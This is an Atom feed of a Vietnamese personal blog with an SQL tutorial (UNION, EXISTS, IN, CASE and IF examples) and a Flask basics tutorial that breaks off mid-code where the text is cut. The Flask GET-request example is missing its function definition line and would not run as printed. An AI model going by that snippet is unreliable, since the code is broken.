<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Rayinaw</title>
  
  <subtitle>Nơi mình ghi chú lại những thứ đã học.</subtitle>
  <link href="https://rayinaw.github.io/atom.xml" rel="self"/>
  
  <link href="https://rayinaw.github.io/"/>
  <updated>2023-02-14T09:33:18.431Z</updated>
  <id>https://rayinaw.github.io/</id>
  
  <author>
    <name>Rayinaw</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>database</title>
    <link href="https://rayinaw.github.io/2023/02/02/database/"/>
    <id>https://rayinaw.github.io/2023/02/02/database/</id>
    <published>2023-02-02T10:14:21.000Z</published>
    <updated>2023-02-14T09:33:18.431Z</updated>
    
    <content type="html"><![CDATA[<h2 id="UNION-va-UNION-ALL"><a href="#UNION-va-UNION-ALL" class="headerlink" title="UNION và UNION ALL"></a>UNION và UNION ALL</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AS</span> my_column</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;2&#x27;</span> </span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> my_column <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AS</span> my_column</span><br><span class="line"><span class="keyword">UNION</span> </span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;2&#x27;</span> </span><br><span class="line"><span class="keyword">UNION</span> </span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="keyword">UNION</span> </span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> my_column <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br></pre></td></tr></table></figure><p>Nhìn ví dụ trên là thấy. UNION sẽ loại bỏ các giá trị trùng nếu như đã có trong bảng còn UNION ALL thì sẽ lấy hết, khá là dễ hiểu.</p><h2 id="Subqueries-WHERE-IN-AND-WHERE-EXISTS"><a href="#Subqueries-WHERE-IN-AND-WHERE-EXISTS" class="headerlink" title="Subqueries: WHERE IN AND WHERE EXISTS"></a>Subqueries: WHERE IN AND WHERE EXISTS</h2><p>WHERE EXISTS: Dùng để lấy ra kết quả nếu trong mệnh đề được lồng sau <code>WHERE EXISTS</code> có trả về bất kỳ thứ gì, kể cả null.<br>Ví dụ:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> customers;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> customer_id <span class="operator">|</span> first_name <span class="operator">|</span> last_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+------------+-----------+</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">1</span> <span class="operator">|</span> John       <span class="operator">|</span> Doe       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">2</span> <span class="operator">|</span> Jane       <span class="operator">|</span> Doe       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">3</span> <span class="operator">|</span> Bob        <span class="operator">|</span> Smith     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+------------+-----------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> orders;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+-------------+</span></span><br><span class="line"><span class="operator">|</span> order_id <span class="operator">|</span> customer_id <span class="operator">|</span> order_total <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+-------------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span>           <span class="number">1</span> <span class="operator">|</span>         <span class="number">100</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2</span> <span class="operator">|</span>           <span class="number">1</span> <span class="operator">|</span>          <span class="number">50</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">3</span> <span class="operator">|</span>           <span class="number">2</span> <span class="operator">|</span>          <span class="number">75</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+-------------+</span></span><br></pre></td></tr></table></figure><p>Truy vấn:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name</span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">FROM</span> orders</span><br><span class="line">    <span class="keyword">WHERE</span> customers.customer_id <span class="operator">=</span> orders.customer_id</span><br><span class="line">    );</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">+------------+-----------+</span></span><br><span class="line"><span class="comment">| first_name | last_name |</span></span><br><span class="line"><span class="comment">+------------+-----------+</span></span><br><span class="line"><span class="comment">| John       | Doe       |</span></span><br><span class="line"><span class="comment">| Jane       | Doe       |</span></span><br><span class="line"><span class="comment">+------------+-----------+</span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure><p>Như ở trên mình bảo, nó sẽ so sánh điều kiện mình cần xét rồi trả về kết quả, nếu kết quả tồn tại thì nó sẽ lấy ra first_name, last_name của customers tương ứng, vậy nên ở đây chúng ta có thể select 1 hoặc * hoặc gì đó cũng được.<br>Mục đích của câu truy vấn trên là để lấy ra first_name, last_name customers đã order sản phẩm.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> customers <span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (<span class="keyword">select</span> <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> first_name <span class="operator">|</span> last_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> John       <span class="operator">|</span> Doe       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Jane       <span class="operator">|</span> Doe       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Bob        <span class="operator">|</span> Smith     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-----------+</span></span><br></pre></td></tr></table></figure><p>Với câu truy vấn này, trong subquery nó luôn trả về 1 nên nó luôn được đánh giá là true, vì vậy nó không ảnh hưởng đến kết quả truy vấn customers, bạn hiểu rõ thêm rồi chứ?</p><p>WHERE IN: Dùng để lấy ra kể quả chứa ở sau mệnh đề in, nó chung mục đích như WHERE EXISTS nhưng không lấy null.<br>Ví dụ với cùng database ở trên:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name</span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line"><span class="keyword">WHERE</span> customer_id <span class="keyword">IN</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> customer_id</span><br><span class="line">    <span class="keyword">FROM</span> orders</span><br><span class="line">    <span class="keyword">WHERE</span> customers.customer_id <span class="operator">=</span> orders.customer_id <span class="comment">-- có thể bỏ dòng này.</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">+------------+-----------+</span></span><br><span class="line"><span class="comment">| first_name | last_name |</span></span><br><span class="line"><span class="comment">+------------+-----------+</span></span><br><span class="line"><span class="comment">| John       | Doe       |</span></span><br><span class="line"><span class="comment">| Jane       | Doe       |</span></span><br><span class="line"><span class="comment">+------------+-----------+</span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure><p>Hoặc chúng ta có thể xác định điều kiện thẳng như sau:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> customers <span class="keyword">WHERE</span> customer_id <span class="keyword">IN</span> (&quot;1&quot;,&quot;2&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> first_name <span class="operator">|</span> last_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> John       <span class="operator">|</span> Doe       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Jane       <span class="operator">|</span> Doe       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-----------+</span></span><br></pre></td></tr></table></figure><p>EXISTS nhanh hơn nhiều so với IN khi kết quả truy vấn con rất lớn. IN nhanh hơn so với EXISTS khi kết quả truy vấn con rất nhỏ. (Người ta nói vậy)</p><h2 id="3-STYLE-CONDITION"><a href="#3-STYLE-CONDITION" class="headerlink" title="3 STYLE CONDITION:"></a>3 STYLE CONDITION:</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> kq.mahv, kq.mamh, kq.diem, <span class="string">&#x27;dat&#x27;</span> <span class="keyword">AS</span> ketqua <span class="keyword">FROM</span> KETQUATHI kq <span class="keyword">WHERE</span> kq.diem <span class="operator">&gt;=</span> <span class="number">8</span> <span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> kq.mahv, kq.mamh, kq.diem, <span class="string">&#x27;khong dat&#x27;</span> <span class="keyword">AS</span> ketqua <span class="keyword">FROM</span> KETQUATHI kq <span class="keyword">WHERE</span> kq.diem <span class="operator">&lt;</span> <span class="number">8</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------+-----------+</span></span><br><span class="line"><span class="operator">|</span> mahv <span class="operator">|</span> mamh <span class="operator">|</span> diem <span class="operator">|</span> ketqua    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------+-----------+</span></span><br><span class="line"><span class="operator">|</span> HV01 <span class="operator">|</span> CTRR <span class="operator">|</span>  <span class="number">8.5</span> <span class="operator">|</span> dat       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV02 <span class="operator">|</span> CSDL <span class="operator">|</span>  <span class="number">8.5</span> <span class="operator">|</span> dat       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV03 <span class="operator">|</span> CTRR <span class="operator">|</span>  <span class="number">9.0</span> <span class="operator">|</span> dat       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV01 <span class="operator">|</span> CSDL <span class="operator">|</span>  <span class="number">7.0</span> <span class="operator">|</span> khong dat <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV01 <span class="operator">|</span> THDC <span class="operator">|</span>  <span class="number">7.0</span> <span class="operator">|</span> khong dat <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV02 <span class="operator">|</span> THDC <span class="operator">|</span>  <span class="number">5.0</span> <span class="operator">|</span> khong dat <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV03 <span class="operator">|</span> CSDL <span class="operator">|</span>  <span class="number">6.0</span> <span class="operator">|</span> khong dat <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV03 <span class="operator">|</span> THDC <span class="operator">|</span>  <span class="number">7.5</span> <span class="operator">|</span> khong dat <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------+-----------+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> kq.mahv, kq.mamh, kq.diem, (<span class="keyword">case</span> <span class="keyword">when</span> diem<span class="operator">&gt;=</span><span class="number">8</span> <span class="keyword">then</span> <span class="string">&#x27;dat&#x27;</span> <span class="keyword">when</span> diem<span class="operator">&lt;</span><span class="number">8</span> <span class="keyword">then</span> <span class="string">&#x27;khong dat&#x27;</span></span><br><span class="line"><span class="keyword">end</span>) <span class="keyword">AS</span> ketqua <span class="keyword">FROM</span> KETQUATHI kq;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------+-----------+</span></span><br><span class="line"><span class="operator">|</span> mahv <span class="operator">|</span> mamh <span class="operator">|</span> diem <span class="operator">|</span> ketqua    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------+-----------+</span></span><br><span class="line"><span class="operator">|</span> HV01 <span class="operator">|</span> CSDL <span class="operator">|</span>  <span class="number">7.0</span> <span class="operator">|</span> khong dat <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV01 <span class="operator">|</span> CTRR <span class="operator">|</span>  <span class="number">8.5</span> <span class="operator">|</span> dat       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV01 <span class="operator">|</span> THDC <span class="operator">|</span>  <span class="number">7.0</span> <span class="operator">|</span> khong dat <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV02 <span class="operator">|</span> CSDL <span class="operator">|</span>  <span class="number">8.5</span> <span class="operator">|</span> dat       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV02 <span class="operator">|</span> THDC <span class="operator">|</span>  <span class="number">5.0</span> <span class="operator">|</span> khong dat <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV03 <span class="operator">|</span> CSDL <span class="operator">|</span>  <span class="number">6.0</span> <span class="operator">|</span> khong dat <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV03 <span class="operator">|</span> CTRR <span class="operator">|</span>  <span class="number">9.0</span> <span class="operator">|</span> dat       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV03 <span class="operator">|</span> THDC <span class="operator">|</span>  <span class="number">7.5</span> <span class="operator">|</span> khong dat <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------+-----------+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> kq.mahv, kq.mamh, kq.diem, IF(diem<span class="operator">&gt;=</span><span class="number">8</span>, <span class="string">&#x27;dat&#x27;</span>, <span class="string">&#x27;khong dat&#x27;</span>) <span class="keyword">AS</span> ketqua <span class="keyword">FROM</span> KETQUATHI kq;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------+-----------+</span></span><br><span class="line"><span class="operator">|</span> mahv <span class="operator">|</span> mamh <span class="operator">|</span> diem <span class="operator">|</span> ketqua    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------+-----------+</span></span><br><span class="line"><span class="operator">|</span> HV01 <span class="operator">|</span> CSDL <span class="operator">|</span>  <span class="number">7.0</span> <span class="operator">|</span> khong dat <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV01 <span class="operator">|</span> CTRR <span class="operator">|</span>  <span class="number">8.5</span> <span class="operator">|</span> dat       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV01 <span class="operator">|</span> THDC <span class="operator">|</span>  <span class="number">7.0</span> <span class="operator">|</span> khong dat <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV02 <span class="operator">|</span> CSDL <span class="operator">|</span>  <span class="number">8.5</span> <span class="operator">|</span> dat       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV02 <span class="operator">|</span> THDC <span class="operator">|</span>  <span class="number">5.0</span> <span class="operator">|</span> khong dat <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV03 <span class="operator">|</span> CSDL <span class="operator">|</span>  <span class="number">6.0</span> <span class="operator">|</span> khong dat <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV03 <span class="operator">|</span> CTRR <span class="operator">|</span>  <span class="number">9.0</span> <span class="operator">|</span> dat       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HV03 <span class="operator">|</span> THDC <span class="operator">|</span>  <span class="number">7.5</span> <span class="operator">|</span> khong dat <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------+-----------+</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;UNION-va-UNION-ALL&quot;&gt;&lt;a href=&quot;#UNION-va-UNION-ALL&quot; class=&quot;headerlink&quot; title=&quot;UNION và UNION ALL&quot;&gt;&lt;/a&gt;UNION và UNION ALL&lt;/h2&gt;&lt;figure c</summary>
      
    
    
    
    <category term="SQL" scheme="https://rayinaw.github.io/categories/SQL/"/>
    
    
    <category term="SQL" scheme="https://rayinaw.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>flask</title>
    <link href="https://rayinaw.github.io/2023/01/12/flask/"/>
    <id>https://rayinaw.github.io/2023/01/12/flask/</id>
    <published>2023-01-11T17:32:39.000Z</published>
    <updated>2023-02-14T09:55:29.586Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Co-ban-ve-Flask-web"><a href="#Co-ban-ve-Flask-web" class="headerlink" title="Cơ bản về Flask web"></a>Cơ bản về Flask web</h1><h2 id="Vi-du"><a href="#Vi-du" class="headerlink" title="Ví dụ"></a>Ví dụ</h2><h3 id="Flask-web-co-ban"><a href="#Flask-web-co-ban" class="headerlink" title="Flask web cơ bản"></a>Flask web cơ bản</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello Flask!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><h3 id="Flask-web-voi-GET-request"><a href="#Flask-web-voi-GET-request" class="headerlink" title="Flask web với GET request"></a>Flask web với GET request</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        r = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + r</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>Yêu cầu GET: <a href="http://127.0.0.1:5000/?name=abc">http://127.0.0.1:5000/?name=abc</a></p><h3 id="Flask-web-voi-POST-request"><a href="#Flask-web-voi-POST-request" class="headerlink" title="Flask web với POST request"></a>Flask web với POST request</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    r = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + r</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><h3 id="Session-voi-Flask-web"><a href="#Session-voi-Flask-web" class="headerlink" title="Session với Flask web"></a>Session với Flask web</h3><ul><li>app.config[‘SECRET_KEY’]: Dùng để lưu biến môi trường SECRET_KEY</li><li>app.secret_key &#x3D; app.config[‘SECRET_KEY’]: dùng để set secret_key cho session là giá trị của biến môi trường SECRET_KEY.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;xxxxxxxx&#x27;</span>  <span class="comment"># set a secret key for signing the session cookies</span></span><br><span class="line">app.secret_key = app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>]  <span class="comment"># set the app secret key</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    session[<span class="string">&#x27;logged_in&#x27;</span>] = <span class="literal">True</span>  <span class="comment"># store a value in the session to indicate that the user is logged in</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You are now logged in.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;logged_in&#x27;</span>, <span class="literal">None</span>)  <span class="comment"># remove the &#x27;logged_in&#x27; key from the session to log out the user</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You are now logged out.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;logged_in&#x27;</span> <span class="keyword">in</span> session:  <span class="comment"># check if the &#x27;logged_in&#x27; key is present in the session</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You are logged in.&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You are not logged in.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></li></ul><p>Một ví dụ khác hay hơn nè.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 